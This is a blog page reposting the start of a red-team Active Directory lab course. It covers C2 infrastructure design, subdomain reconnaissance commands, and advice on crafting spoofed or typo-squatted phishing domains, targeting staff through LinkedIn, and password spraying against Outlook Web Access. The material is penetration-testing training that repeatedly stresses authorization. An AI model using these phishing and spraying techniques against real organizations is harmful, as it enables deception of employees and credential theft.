

  <!DOCTYPE html>
  <html lang="en" data-default-color-scheme=&#34;dark&#34; >
  <style>
    .text1
    {
    text-shadow: 0px 0px 2px #f2f3f2;
    }
    </style>

  

<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/null">
  <link rel="icon" type="image/png" href="/null">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <title>攻击链四：域渗透案例一 - whale3070&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


    <body>
      <header style="height: 70vh;">
        <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>InfoSec learning</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          
        
      </ul>
    </div>
  </div>
</nav>

          <div class="banner" id="banner" false
            style="background: url('/img/default.png') no-repeat center center;
              background-size: cover;">
              <div class="full-bg-img">
                <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
                  <div class="page-header text-center fade-in-up">
                    <span class="h2 text1" id="subtitle" title="攻击链四：域渗透案例一">
                      
                        攻击链四：域渗透案例一
                      
                    </span>
        
                    
                      <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-06-22 11:12" pubdate>
        June 22, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      21.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      428
       分钟
    </span>
  

  
  
</div>

                    
                  </div>
                    
                  </div>
                  
                </div>
              </div>
          </div>
      </header>

      <main>
        
          

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">攻击链四：域渗透案例一</h1>
            
            <div class="markdown-body">
              <p><a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#_Toc43379476">INTRODUCTION TO RED TEAMING</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#tools-used">Tools used</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#introduction-to-red-teaming-1">Introduction to Red Teaming</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#initial-reconnaissance-bonus-not-related-to-the-lab">Initial reconnaissance</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#designing-a-phishing-scenario-bonus-not-related-to-the-lab">Designing a phishing scenario</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#setting-up-covenant-perform-this-on-your-attacking-machine">Setting up Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#covenant-launchers-and-grunts-practice-this-on-your-attacking-machine">Covenant Launchers and Grunts</a></p>
<p><a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#initial-access">INITIAL ACCESS</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#compromising-win10-web">Compromising Win10-WEB</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#first-grunt">First Grunt</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#clm-bypass">CLM Bypass</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#section">Windows Defender and AMSI</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#reconnaissance-after-compromise">Reconnaissance after compromise</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#privilege-escalation-with-covenant">Privilege escalation with Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#elevation-from-administrator-to-system">Elevation from administrator to System</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#compromising-jumpbox">Compromising Jumpbox</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#extending-foothold-on-jumpbox">Extending foothold on Jumpbox</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#dumping-credentials-with-covenant">Dumping credentials with Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#dumping-credentials-with-safetykatz">Dumping credentials with safetykatz</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#impersonating-users-with-covenant">Impersonating users with Covenant</a></p>
<p><a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#domain-attacks">DOMAIN ATTACKS</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#starting-point">Starting point</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#domain-reconnaissance">Domain Reconnaissance</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#domain-reconnaissance-ii">Domain reconnaissance II</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#rubeus-inside-covenant">Rubeus inside Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#exploiting-unconstrained-delegation">Exploiting Unconstrained Delegation</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#domain-acl-exploitation">Domain ACL Exploitation</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#exploiting-misconfigured-acls">Exploiting Misconfigured ACLs</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#setting-up-bloodhound">Setting up Bloodhound</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#using-bloodhound">Using Bloodhound</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bloodhound-ingestors">Bloodhound Ingestors</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bloodhound-collection-methods">Bloodhound Collection methods</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bloodhound-interface">Bloodhound interface</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bloodhound-custom-queries">Bloodhound custom queries</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#mapping-gpo-misconfigurations-using-sharphound">Mapping GPO misconfigurations using Sharphound</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#using-invoke-aclscanner-along-with-bloodhound">Using Invoke-ACLScanner along with Bloodhound</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#gpo-abuse">GPO Abuse</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#in-memory-.net-execution">In-memory .NET execution</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#asreproasting-and-kerberoasting-with-covenant">ASREPRoasting and Kerberoasting with Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#domain-persistence-with-golden-ticket">Domain persistence with Golden Ticket</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#golden-ticket-and-dcsync-with-covenant-refresher">Golden ticket and DCSync with Covenant</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#maintaining-access-without-a-golden-ticket">Maintaining access without a golden ticket</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#silver-tickets">Silver tickets</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#remote-registry-backdoor">Remote registry backdoor</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#attacking-trusts">Attacking trusts</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#forging-trust-ticket-with-impacket">Forging trust ticket with Impacket</a></p>
<p><a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#pivoting-and-lateral-movement">PIVOTING AND LATERAL MOVEMENT</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#smb-grunts">SMB Grunts</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#from-http-ntlm-relay-to-dc-access">FROM HTTP NTLM Relay to DC Access</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#lateral-movement-using-psremoting">Lateral movement using PSRemoting</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#wmi-launcher">WMI Launcher</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#passing-session-to-metasploit">Passing session to Metasploit</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#attacking-sql-server">Attacking SQL Server</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#smb-grunts">Pivoting using Portproxy and SMBGrunts</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#direct-pivoting-with-portproxy-and-covenant">Direct pivoting with portproxy and covenant</a></p>
<p><a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#local-tasks">LOCAL TASKS</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#local-persistence">Local Persistence</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#wmi-backdoor">WMI Backdoor</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#connecting-covenant-with-c3-framework">Connecting Covenant with C3 Framework</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#section-1">Using Covenant launchers with Gadget to Jscript</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#hybrid-binary-powershell-launcher">Hybrid binary-powershell launcher</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bypassing-uac">Bypassing UAC</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#windows-defenses">Windows Defenses</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#using-covenant-in-applocker-enabled-environments">Using Covenant in Applocker-enabled environments</a></p>
<p>​ <a target="_blank" rel="noopener" href="https://my.ine.com/CyberSecurity/courses/9328123b/penetration-testing-red-teaming-active-directory#bypassing-applocker-with-dll-launcher">Bypassing applocker with DLL Launcher</a></p>
<h1 id="INTRODUCTION-TO-RED-TEAMING"><a href="#INTRODUCTION-TO-RED-TEAMING" class="headerlink" title="INTRODUCTION TO RED TEAMING"></a>INTRODUCTION TO RED TEAMING</h1><h2 id="Tools-used"><a href="#Tools-used" class="headerlink" title="Tools used:"></a>Tools used:</h2><p><strong>covenant</strong> v0.4</p>
<p><strong>kali</strong> 2019/4 (includes default version of socat, Metasploit and other built-in tools)</p>
<p><strong>powerview</strong> from PowerTools 2.0 repository <a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/releases">https://github.com/PowerShellEmpire/PowerTools/releases</a></p>
<p><strong>mimikatz</strong> 2.2.0</p>
<p><strong>Visual Studio</strong> 2017 with MSBuild 15</p>
<p><strong>socat</strong> for Windows (1.7.3)</p>
<h2 id="Introduction-to-Red-Teaming"><a href="#Introduction-to-Red-Teaming" class="headerlink" title="Introduction to Red Teaming"></a>Introduction to Red Teaming</h2><p>There is no strict definition of “Red Teaming” however its general purpose is to simulate a real-world threat to an organization. The primary goal is to show the potential impact, not to obtain maximum privileges - this is not a CTF competition.</p>
<p>The impact can be shown by e.g. demonstrating access to sensitive data and critical servers or the ability to alter information and process flows within the organization.</p>
<p>The result of the exercise should be recommendations to the audited company on:</p>
<ul>
<li><p>  How to handle incidents like the tested scenarios</p>
</li>
<li><p>  How to better detect intrusion attempts</p>
</li>
</ul>
<p>In red team engagements traditional reverse shells are no longer used their role has been taken by complex C2 (Command &amp; Control) frameworks that are able to receive and maintain hundreds of concurrent “shells”.</p>
<p>Moreover, physical access, however still practiced, is often not needed. Traditional red teaming often starts with a physical engagement which ends up in planting a hardware backdoor (or simply a laptop) inside the target organization. In the context of this red team lab, we will focus on a scenario where access to the target organization is achieved remotely e.g. via phishing or password spraying. This is often the way attackers gain access to organizations.</p>
<p>A potential C2 infrastructure can look similar to the below image:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image3.png" srcset="/img/loading.gif"></p>
<p><a target="_blank" rel="noopener" href="https://packt-type-cloud.s3.amazonaws.com/uploads/sites/2432/2018/12/26b0fda1-5498-470e-9257-8fab7586af4d.png">https://packt-type-cloud.s3.amazonaws.com/uploads/sites/2432/2018/12/26b0fda1-5498-470e-9257-8fab7586af4d.png</a></p>
<p>A C2 infrastructure may consist of:</p>
<ul>
<li><p>  A SMTP Server - which will be used to distribute phishing emails</p>
</li>
<li><p>  A Payload server - which will be used to serve any files that will be downloaded to victim devices</p>
</li>
<li><p>  Implants (Agents) - basically the reverse shells which are created in a standardized, C2-compatible format. Usually C2 frameworks allow to create compatible implants in the same way as you can create msfvenom payloads using the Metasploit framework.</p>
</li>
<li><p>  Redirectors - servers that act as a proxy between the victim and the back-end infrastructure. Implants will connect to redirectors and will have their traffic passed further to the back-end, while any non-implant originating traffic will be dropped, effectively protecting the back-end infrastructure from potential investigation or counter-attack attempts.</p>
</li>
<li><p>  Network traffic has to be crafted in a way that it will not be easily distinguished from legitimate HTTP traffic. This means that implants should communicate over HTTPS which can be easily disguised as legitimate web browsing. For additional security any communication can be asynchronous or use techniques like domain fronting.</p>
</li>
<li><p>  The backend C2 server is the heart of whole operations. Here all implants can be managed and the operator can manage all the controlled devices within target organization.</p>
</li>
</ul>
<p>You can read more about designing red team infrastructures below:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p>
<p>There are lot of C2 frameworks to choose from and there is no clear winner between them. Some popular choices are:</p>
<ul>
<li><p>  Cobalt strike (commercial) <a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a></p>
</li>
<li><p>  Metasploit (free and commercial) <a target="_blank" rel="noopener" href="https://www.metasploit.com/">https://www.metasploit.com/</a></p>
</li>
<li><p>  Covenant (Open source) <a target="_blank" rel="noopener" href="https://github.com/cobbr/Covenant">https://github.com/cobbr/Covenant</a></p>
</li>
<li><p>  SharpC2 (Open source) <a target="_blank" rel="noopener" href="https://github.com/SharpC2/SharpC2">https://github.com/SharpC2/SharpC2</a></p>
</li>
<li><p>  SilentTrinity (Open source) <a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/SILENTTRINITY">https://github.com/byt3bl33d3r/SILENTTRINITY</a></p>
</li>
<li><p>  Faction (Open source) <a target="_blank" rel="noopener" href="https://www.factionc2.com/">https://www.factionc2.com/</a></p>
</li>
<li><p>  Koadic (Open source) <a target="_blank" rel="noopener" href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a></p>
</li>
<li><p>  Resurrected PowerShell Empire (Open source) <a target="_blank" rel="noopener" href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a></p>
</li>
</ul>
<p>In the context of this lab we will use Covenant (written in .NET), however you are free to use the C2 framework of your choosing.</p>
<p>In the following scenario we will try to operate as if we were performing an internal red team assessment against a real target (ELS.LOCAL). During this lab we will perform thorough reconnaissance/enumeration activities, obtain initial foothold into the target organization, and then try to extend our foothold by identifying all possible attack paths and misconfigurations.</p>
<p>During the tests, which you are encouraged to follow along, we will use two Virtual Machines a <strong>Windows 10</strong> and a <strong>Kali Linux 2019.4</strong>. For more information about the used setup please refer to <strong>Tools Used</strong> part above.</p>
<h2 id="Initial-reconnaissance-Bonus-not-related-to-the-lab"><a href="#Initial-reconnaissance-Bonus-not-related-to-the-lab" class="headerlink" title="Initial reconnaissance (Bonus, not related to the lab)"></a>Initial reconnaissance (Bonus, not related to the lab)</h2><p>This lab simulates an internal red teaming engagement. That being said let’s be reminded of the initial reconnaissance steps that we should take during external engagements. In the beginning of an external red teaming engagement, prior to any attack-related activities, we should carefully analyze the attack surface of the targeted organization. Numerous OSINT techniques can help us figure out if there are any exploitable weaknesses on the external perimeter of the targeted organization.</p>
<p>We can use our Kali machine in order to perform some basic checks against a target company. To be on the safe side, use any company that is running a bug bounty program, for example, Google.</p>
<p>If we wanted to target google.com, first thing we need to check in a red team assessment is if we have permission to attack that website. Although real attackers will not care about this, we are still on the “ethical” side of hacking. We should thus always operate taking into consideration any legal restrictions.</p>
<p>If a website is hosted by a third-party provider or leverages shared hosting (which the case on smaller companies), we must not target such an asset. Start by issuing the following commands:</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">dig </span>google.com +<span class="hljs-keyword">short</span><br><span class="hljs-keyword"></span>whois <span class="hljs-number">216</span>.<span class="hljs-number">58</span>.<span class="hljs-number">215</span>.<span class="hljs-number">78</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image4.png" srcset="/img/loading.gif"></p>
<p>We can see that the above IP address is within a range owned by Google, so this could be a valid target.</p>
<p>You should perform such a verification against any domain you are about to assess.</p>
<p>Attacking the exposed or a well-known subdomain of a target organization is like charging at the front door. It is very likely that any application that is frequently used and/or is well-known to external users is thoroughly secured and monitored. As an attacker, you would like to identify less obvious entry points, like forgotten external-facing dev servers or rarely used web applications.</p>
<p>One of the ways to do this could be performing subdomain enumeration. If you are lucky, you might also be able to find a misconfigured DNS server which is vulnerable to Zone Transfer - and obtain all the subdomains it is capable of resolving.</p>
<p>For example, you might want to use dnscan (<a target="_blank" rel="noopener" href="https://github.com/rbsec/dnscan">https://github.com/rbsec/dnscan</a>), which will allow to identify subdomains through a brute-force approach (using a wordlist) or through an attempted zone transfer. See an example below.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image5.png" srcset="/img/loading.gif"></p>
<p>Another tool you might be interested in is amass. Amass performs complex reconnaissance against subdomains. It has multiple advanced options that you can explore. On a Kali machine you should be able to get and use Amass as follows.</p>
<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install amass<br>amass enum -active -d google.<span class="hljs-keyword">com</span> -v -<span class="hljs-keyword">o</span> google.<span class="hljs-keyword">com</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image6.png" srcset="/img/loading.gif"></p>
<p>You should start getting more and more new google subdomains.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image7.png" srcset="/img/loading.gif"></p>
<p>As Google is a very large organization, this could produce a huge list of results. Even for smaller organizations you will still be able to get quite some information. Each subdomain can be potential entry point to the target.</p>
<p><strong>Note</strong>: Even stealthier (and passive) subdomain enumeration can be achieved by analyzing SSL certificates. <a target="_blank" rel="noopener" href="https://censys.io/">https://censys.io/</a> collects such data.</p>
<h2 id="Designing-a-phishing-scenario-Bonus-not-related-to-the-lab"><a href="#Designing-a-phishing-scenario-Bonus-not-related-to-the-lab" class="headerlink" title="Designing a phishing scenario (Bonus, not related to the lab)"></a>Designing a phishing scenario (Bonus, not related to the lab)</h2><p>The first rule of successful phishing is to convince your target that the mail he/she is opening is coming from a legitimate source. You should take for granted that in mature organizations, security awareness training has taken place. This means that people may check the sender domain (however, only few will do so).</p>
<p>In an ideal scenario you may encounter a misconfigured corporate e-mail server. Spoofcheck (<a target="_blank" rel="noopener" href="https://github.com/BishopFox/spoofcheck">https://github.com/BishopFox/spoofcheck</a>) is a very handy tool that can help you check if a domain can be spoofed from.</p>
<p>If you have problems running spoofcheck, you should use python2. On Kali, type:</p>
<figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">pip2 <span class="hljs-keyword">install</span> -r requirements.txt<br>python2 spoofcheck.py<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image8.png" srcset="/img/loading.gif"></p>
<p>In other cases, you may want to try using homoglyphs or alter the letters’ order in your phishing domain name. Say you want to pretend you are sending an email from <em>targetcompany.com</em>. You can try to register domain (and set up a mail server) like <em>targetcopmany.com</em> or <em>targetcompany.biz</em> (or whatever tld is available and looks convincing).</p>
<p>After setting up a convincing e-mail, you will also need to seek your victims. Spear-phishing is so successful only because it uses a strong pretext behind the scenario - which can only be achieved through proper OSINT.</p>
<p>For example, you want to send an e-mail only to a certain department of the targeted company. In order to achieve that, LinkedIn might be a very helpful source of information. Through a source like LinkedIn you can search for a certain company and identify all employees linked to it. Based on their public posts you may be able to figure out what projects they are currently working on or what currently matters for them the most. This can be a priceless addition to your social engineering scenario.</p>
<p>Another factor that will add reliability to your attack is gathering and then leveraging valid credentials after performing an initial breach. Such credentials may allow you to authenticate to a corporate e-mail server which may be vulnerable to relaying or you can simply send an e-mail as the person whose credentials you possess (be careful though, since there is high likelihood that someone will go back to your victim personally and ask for an email they did not sent).</p>
<p>As already covered in the course, another way of identifying valid credentials is password spraying. Password spraying requires an authentication endpoint (like an Outlook Web Application or Lync endpoint) and a large list of valid logins (preferably logins used in corporate SSO) in order to try a small number of popular or guessable passwords against a large amount of accounts. A helpful tool for that can be <a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/SprayingToolkit">https://github.com/byt3bl33d3r/SprayingToolkit</a>.</p>
<p>Using SprayingToolkit, you may be able to conduct a successful password spraying attack against an OWA (Outlook Web Application) Endpoint using <em>atomizer.py</em>.</p>
